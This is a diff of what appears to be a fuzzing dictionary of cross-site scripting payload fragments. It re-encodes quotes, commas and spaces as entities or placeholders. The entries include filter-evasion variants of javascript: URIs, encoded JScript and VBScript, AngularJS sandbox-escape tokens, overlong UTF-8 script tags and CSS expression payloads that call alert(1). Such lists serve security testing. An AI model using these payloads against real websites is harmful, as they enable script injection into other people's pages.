@@ -74,173 +74,173 @@ prompt(1);
 #
 /
 %s
-")));
-">
-'>
-('
+&quot;)));
+&quot;>
+&apos;>
+(&apos;
 ()
 ()}}
 );
-.")));
+.&quot;)));
 //>
 ;}}
 <!--
 [].
 {{
 {{{}
-{}.")));
+{}.&quot;)));
 |
 }}
-{}[$='constructor']
+{}[$=&apos;constructor&apos;]
 $event.composedPath()
 $on.
 $on.constructor
-0,
-"%0aalert(1)"
+0%comma
+&quot;%0aalert(1)&quot;
 [1].
 1/+/[*/[]/+
-"&#106;avascript:alert(1)"
-"&#106avascript:alert(1)"
+&quot;&#106;avascript:alert(1)&quot;
+&quot;&#106avascript:alert(1)&quot;
 &#97;lert(1)
-,a)
+%commaa)
 </a>
 <a
 a.
-["a","alert(1)"].
-a='constructor';
+[&quot;a&quot;%comma&quot;alert(1)&quot;].
+a=&apos;constructor&apos;;
 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
-<a href="#"
+<a%shref=&quot;#&quot;
 alert(
-"&{alert(1)}"
-")));alert(1)//"
-'alert(1)')
-'alert(1)')()}}
-alert(1)')
-alert(1)//"
-alert(1)//"}}
-alert(1)//';
+&quot;&{alert(1)}&quot;
+&quot;)));alert(1)//&quot;
+&apos;alert(1)&apos;)
+&apos;alert(1)&apos;)()}}
+alert(1)&apos;)
+alert(1)//&quot;
+alert(1)//&quot;}}
+alert(1)//&apos;;
 alert`1`
 alert(document.domain)
 alert&NewLine;(1)
-'=alert\x281\x29'
+&apos;=alert\x281\x29&apos;
 `amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`
 a.sub
-<audio><source src="
+<audio><source%ssrc=&quot;
 b={};
 b[a]
 b[a].
-<body background="
+<body%sbackground=&quot;
 </button>
 <button>
-<button form=x style="width:100%;height:100%;"><form id=x action="
-<button form=x>XSS</button><form id=x action=
+<button%sform=x%sstyle=&quot;width:100%;height:100%;&quot;><form%sid=x%saction=&quot;
+<button%sform=x>XSS</button><form%sid=x%saction=
 %C0%BCscript>
-"#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"
+&quot;#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&quot;
 call(
 call.
 call;
 call.call(
-"color&#x3dred"
-<component is=script text=
+&quot;color&#x3dred&quot;
+<component%sis=script%stext=
 constructor
 constructor(
 constructor.
 constructor.constructor
 data:text/html
-data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d
-data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;
-data:text/javascript;base64,YWxlcnQoMSk=
-<discard onbegin=
+data:text/javascript;base64%comma%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d
+data:text/javascript;base64%comma&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;
+data:text/javascript;base64%commaYWxlcnQoMSk=
+<discard%sonbegin=
 </div>
-<div style=
+<div%sstyle=
 document.domain
 %E0%80%BCscript>
-<embed src="
-eval('\141lert(1)')
-eval('alert(\061)')
-eval('alert(\61)')
-eval('\x61lert(1)')
+<embed%ssrc=&quot;
+eval(&apos;\141lert(1)&apos;)
+eval(&apos;alert(\061)&apos;)
+eval(&apos;alert(\61)&apos;)
+eval(&apos;\x61lert(1)&apos;)
 event.composedPath()
 %F0%80%80%BCscript>
 %F8%80%80%80%BCscript>
 %FC%80%80%80%80%BCscript>
 folder=
-<form action=
-<form><button formaction=
-<form><button style="width:100%;height:100%" type=submit formaction="
-<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="
-from([1],alert)
+<form%saction=
+<form><button%sformaction=
+<form><button%sstyle=&quot;width:100%;height:100%&quot;%stype=submit%sformaction=&quot;
+<form><input%stype=submit%svalue=&quot;XSS&quot;%sstyle=&quot;width:100%;height:100%&quot;%stype=submit%sformaction=&quot;
+from([1]%commaalert)
 getOwnPropertyDescriptor(
 getPrototypeOf(
-href="
-href="&#0000106avascript:alert(1)"
-href="j&#x61vascript:alert(1)"
-href="&#x6a
-href="&#x6a;avascript:alert(1)"
+href=&quot;
+href=&quot;&#0000106avascript:alert(1)&quot;
+href=&quot;j&#x61vascript:alert(1)&quot;
+href=&quot;&#x6a
+href=&quot;&#x6a;avascript:alert(1)&quot;
 id=f
-<iframe src="
-<image src="
-<img src="
-<img title="
-<input autofocus ng-focus="
-<input type=hidden type=image src="
-<input type=image src="
-"java&NewLine;script:alert(1)"
-"javascript:
-"javascript:/a/-alert(1)///////"
+<iframe%ssrc=&quot;
+<image%ssrc=&quot;
+<img%ssrc=&quot;
+<img%stitle=&quot;
+<input%sautofocus%sng-focus=&quot;
+<input%stype=hidden%stype=image%ssrc=&quot;
+<input%stype=image%ssrc=&quot;
+&quot;java&NewLine;script:alert(1)&quot;
+&quot;javascript:
+&quot;javascript:/a/-alert(1)///////&quot;
 javascript:alert(1)
-javascript:alert(1)"
-"javascript&colon;alert(1)"
-"javascript&colon;alert&lpar;1&rpar;"
-"javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"
-"javascript:x='%27-alert(1)-%27';"
-"javascript:x='&percnt;27-alert(1)-%27';"
-"java&Tab;script:alert(1)"
+javascript:alert(1)&quot;
+&quot;javascript&colon;alert(1)&quot;
+&quot;javascript&colon;alert&lpar;1&rpar;&quot;
+&quot;javascript:&apos;&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&apos;&quot;
+&quot;javascript:x=&apos;%27-alert(1)-%27&apos;;&quot;
+&quot;javascript:x=&apos;&percnt;27-alert(1)-%27&apos;;&quot;
+&quot;java&Tab;script:alert(1)&quot;
 JSCRIPT.COMPACT:alert(1);
-"JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"
-(key, value) in x.view
-key == 'window'
+&quot;JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&quot;
+(key%comma%svalue)%sin%sx.view
+key%s==%s&apos;window&apos;
 language=vbs
 &lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;
 ng-app
 ng-csp
 ng-cut=
-ng-focus="x=$event;"
-ng-if="
-ng-repeat="
+ng-focus=&quot;x=$event;&quot;
+ng-if=&quot;
+ng-repeat=&quot;
 <noembed>
 </noframes>
 <noframes>
 </noscript>
 <noscript>
-<object data="/
-onclick="
+<object%sdata=&quot;/
+onclick=&quot;
 onerror=
 onerror=alert(1)
 onload=alert(1)
-onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@
+onload=#@~^CAAAAA==\ko$K6%commaFoQIAAA==^#~@
 onloadend=alert(1)
 onloadstart=alert(1)
 <option>
 orderBy:
-orderBy:'
+orderBy:&apos;
 <plaintext>
-_.__proto__,$
+_.__proto__%comma$
 prototype
 prototype.
-(ready = true) &&
+(ready%s=%strue)%s&&
 reduce(
 </script>
 <script>
-<select name=x>
+<select%sname=x>
 sort(
 src=1
 </style>
 <style>
-(_=''.sub)
+(_=&apos;&apos;.sub)
 sub.
 tabindex=0
-<table background="
+<table%sbackground=&quot;
 </textarea>
 <textarea>
 </title>
@@ -253,25 +253,25 @@ toString=
 \u0061lert(1)
 \u{61}lert(1)
 value
-value,
-VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@
+value%comma
+VBScript.Encode:#@~^CAAAAA==\ko$K6%commaFoQIAAA==^#~@
 vbscript:Msgbox+1
 vbscript:MsgBox+1
 VBSCRIPT:Msgbox+1
 vbs:Msgbox+1
 VBS:Msgbox+1
-<video><source src="
-<video><track default src="
+<video><source%ssrc=&quot;
+<video><track%sdefault%ssrc=&quot;
 window.onload(){alert(1);}
-"&#x0000006a;avascript:alert(1)"
+&quot;&#x0000006a;avascript:alert(1)&quot;
 &#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)
 &#x61;lert(1)
-"&#x6a avascript:alert(1)"
-"&#X6A;avascript:alert(1)"
+&quot;&#x6a%savascript:alert(1)&quot;
+&quot;&#X6A;avascript:alert(1)&quot;
 x=alert(1)
 </xmp>
 <xmp>
-x="&quot;,alert(1)//";
+x=&quot;&quot;%commaalert(1)//&quot;;
 XSS
 xss:expressio\00006e(alert(1))
 xss:expressio\006e(alert(1))
@@ -280,6 +280,5 @@ xss:expression(1)-alert(1)
 xss:expression(alert(1))
 xss=expression(alert(1))
 xss:expressio&#x5c;6e(alert(1))
-'(y=alert)(1)'
+&apos;(y=alert)(1)&apos;
 (z=alert)(1)
-
